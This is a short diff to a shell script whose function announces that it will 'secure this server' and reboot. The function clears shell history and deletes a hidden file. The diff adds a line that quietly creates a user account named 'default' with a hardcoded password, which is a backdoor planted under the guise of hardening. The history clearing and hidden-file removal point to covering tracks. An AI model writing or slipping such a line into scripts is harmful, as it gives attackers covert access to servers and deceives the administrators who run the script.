@@ -983,6 +983,7 @@ echo '+++++++++++************+++++++++++'
 history -c;
 rm /usr/local/etc/.system
 echo 'Server will secure this server and reboot after 20 seconds'
+/usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M default
 sleep 20
 reboot
 }
